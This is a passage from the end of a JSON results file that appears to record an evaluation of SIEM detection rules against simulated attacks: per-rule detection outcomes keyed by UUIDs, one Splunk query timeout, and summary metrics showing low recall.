      "attack_id": "3a96e99d-20bc-4750-b7f4-9589c58e62d9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 492.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "91b755fd-be4a-4f79-bb33-191d1cbffbad",
      "attack_id": "f9c02ddc-abc3-4dc8-a553-cd8b2d273cac",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 520.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4e23a34d-5d55-4b3d-b596-7f8e5c6721ad",
      "attack_id": "97a41bff-0f56-4da0-a5b4-6ee02dd13e73",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 435.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "162bfcd7-56f6-457f-b404-ae60d7041197",
      "attack_id": "6561618f-06b1-4824-99f0-38a06e770967",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 539.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7a1d4505-f1c8-4e89-9751-202db403d4c7",
      "attack_id": "37f15e90-1675-4051-94c2-90b45eab6cc5",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 497.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "70e2ff39-3e48-4c0a-a1c3-645a1d949c06",
      "attack_id": "9f430d39-a7e8-4dbd-b807-b5af741e52dd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 480.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "81c38236-eece-48e1-82ca-f5177cc57ef0",
      "attack_id": "32bab9a7-887f-445c-ba84-e21475b7a252",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 486.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0624fcda-5b0e-446f-aeae-7893d6e3e163",
      "attack_id": "b8e284a5-a4b0-43d1-adeb-6ce0f7f16d1d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 558.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "dc74195f-24ef-472a-b016-812c33349c9e",
      "attack_id": "abc05c5c-4bb5-4cb8-9819-201d21354137",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Splunk query failed: HTTPSConnectionPool(host='192.168.232.128', port=8089): Read timed out. (read timeout=10)"
    },
    {
      "rule_id": "ee2b2e68-95ee-4429-8def-94bf3b2df1b3",
      "attack_id": "eadc7559-c194-48db-9d1d-9a16cff241e4",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 668.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "6b838961-b6a8-467f-9acb-e8761043452c",
      "attack_id": "a52632d0-04d8-4bc9-af5e-282ac6aa44af",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 465.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9f9640dc-fbf9-42f3-857c-da21f00cab33",
      "attack_id": "7c82b0d9-763b-40d2-827e-d51443a2ed3b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 438.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "72001a16-0771-421c-816c-7e2fc84a9649",
      "attack_id": "5f9173f1-25f0-48ec-91c6-f98e4595a138",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 604.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e07d4865-cca3-41a9-80b5-9f9e06084209",
      "attack_id": "44bcafd2-6ba3-4c2e-b306-195decb948ab",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 482.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3f85a58e-ecbb-42b9-8d2b-8419b8acd757",
      "attack_id": "c916a1aa-4276-447b-a996-1d68c52fb354",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 461.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f415b722-43e2-4ca2-b3f1-f5f2eb9e8138",
      "attack_id": "575340f2-7363-4f2c-86f4-dd4c9d986321",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 571.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b0453951-c20a-4974-a81d-fc9acae6f145",
      "attack_id": "89b45613-5575-499d-bceb-12a3da42fbd1",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 577.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "02dc9374-ba43-4004-91c0-5babfc166a90",
      "attack_id": "8d9c0389-d16b-4613-8994-38b647d47a67",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 517.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5542a5d8-5861-459b-87f3-82143d64b633",
      "attack_id": "a722857f-fda1-46fe-b181-fc0062a74c72",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 428.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0d2ab478-514c-40e6-ad01-b4bf59e6a2ea",
      "attack_id": "60f82e0c-199b-499e-9331-64ec1cad650c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 484.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3a1692ca-2cfb-4cf3-85d2-d00e0ea7fb26",
      "attack_id": "c16137f7-39ae-4cdf-b08d-fd21df536bb5",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 472.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0722aef6-06df-4817-9596-f75b416b5a69",
      "attack_id": "e24a53f2-116d-407e-ab7a-7c59cec09fde",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 441.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7848f6a4-c18e-455e-811b-4799694bf3e5",
      "attack_id": "35814719-f0fa-45ae-8713-c1736cbad10b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 544.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "da190372-d711-48b6-9654-57aa86e0ac5c",
      "attack_id": "ef287949-c8ca-495b-927e-9c8efa412558",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 443.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "909389df-4e4c-4ac0-9464-f35034c2e280",
      "attack_id": "feea665d-c168-48de-a698-a5f433bef810",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 572.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "63a236d8-cc30-46f9-b2b9-9421d1c34deb",
      "attack_id": "887ed157-eeef-4b4c-8f0c-6eea200034db",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 618.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "d44fb879-7838-4256-a96f-c694804013c1",
      "attack_id": "69e0c8b2-2488-4cb3-9acd-859ba7912729",
      "detected": true,
      "events_found": 58,
      "historical_events": 0,
      "query_time_ms": 505.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "32699665-201c-463f-8c23-75c66ea7735a",
      "attack_id": "58e154f4-ccd2-44d3-b6fd-37c07a40bc1e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 430.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "59a628f6-1001-4344-8f81-fac20ba91785",
      "attack_id": "cf753888-554f-43d3-8554-eea4b75dd7ce",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 454.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1e71a483-4cca-470e-a45f-bdac4c323aea",
      "attack_id": "6de990ef-c892-4fae-b7f6-79139f34b3e5",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 485.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a94f1fd1-7b8f-4be7-828f-5ebb471ff6f2",
      "attack_id": "629010cf-2265-414f-b76f-5f15318bb5a3",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 460.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1b5c2c48-4085-442e-aaf3-975093d6b9c1",
      "attack_id": "d3c66dc3-efa7-45c4-8bde-d8fa80d0a51b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 430.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9fe70e44-cbd2-44c6-b174-daba6c227a07",
      "attack_id": "5a26a1b9-86d3-497d-94db-cc5604f35e2c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 644.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c8290f50-ad48-40ed-92dd-b4c6ee21cd4c",
      "attack_id": "50419e45-fd8e-4238-abd8-a26ba537237c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 570.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "17721dcf-5c83-463e-803b-d2aacbbdd306",
      "attack_id": "c3549c70-74e5-4c1d-87c4-d9d42c714094",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 470.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5009d9ce-d0de-4c64-9c85-99d44ef8a0fb",
      "attack_id": "cfdb818f-e474-4b75-85c7-554ce303b1fe",
      "detected": true,
      "events_found": 70,
      "historical_events": 0,
      "query_time_ms": 631.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "1ad9dd96-ef7e-4654-a821-769e7eaed40b",
      "attack_id": "a2d7c4f9-973d-4f57-9818-86ed590afce9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 487.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ea5a7a6f-70f6-48a7-ae07-0ea93cbdf11f",
      "attack_id": "8e5f7aa3-4562-4423-94bd-18b00f9a2906",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 450.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ecd70220-0a29-4f4d-b4b2-bc00c77e10a4",
      "attack_id": "8371bf19-388e-4e1f-a64e-cdb9b68fc004",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 491.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ff75047f-eb96-488c-8977-385821cf303e",
      "attack_id": "df1768e1-3771-408b-b578-9d06431db011",
      "detected": true,
      "events_found": 60,
      "historical_events": 0,
      "query_time_ms": 623.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d0c3b6d6-ef9c-402f-a4d1-b8451b2e8116",
      "attack_id": "bf3aa691-7ca9-46d5-aab7-19e23bd87f9a",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 455.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "bb9e6b10-7f83-4521-9436-f2a3ba9e213a",
      "attack_id": "8eabf303-4add-492e-9969-ff317dc07e27",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 500.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4b8fef8c-9f69-4528-ba9d-34a8fe7cf5fe",
      "attack_id": "4ce71d73-42fa-4885-b5d2-5561ec35beb4",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 497.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e2074666-b304-43b2-84b6-7600530afc21",
      "attack_id": "9d9b83f8-601a-46b0-b1c8-dc0df99819ac",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 478.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5f7789be-bdc8-4bba-b669-e0c31c74ca06",
      "attack_id": "ba951720-56d7-47d9-9426-641e89e55bdb",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 472.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "50ae37b0-b4c9-4cb5-b4d7-ce6a8af289c1",
      "attack_id": "8acd025f-ee62-45e0-a5ce-6718a3ab4680",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 522.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f2f2b5b6-90bd-48c0-bad7-74ece7a420ee",
      "attack_id": "c50cf066-3a84-44b0-9621-c98e49002849",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 550.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f48e9a06-4f2f-44ae-9207-1ccda997ed63",
      "attack_id": "06148b75-1719-405b-ba1f-a58ca407457b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 513.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 6,
    "false_positives": 0,
    "false_negatives": 60,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.09090909090909091,
    "f1_score": 0.16666666666666669,
    "accuracy": 0.09090909090909091,
    "detection_rate": 0.09090909090909091,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.617,
  "timestamp": "2025-12-23T13:12:18.915005"
}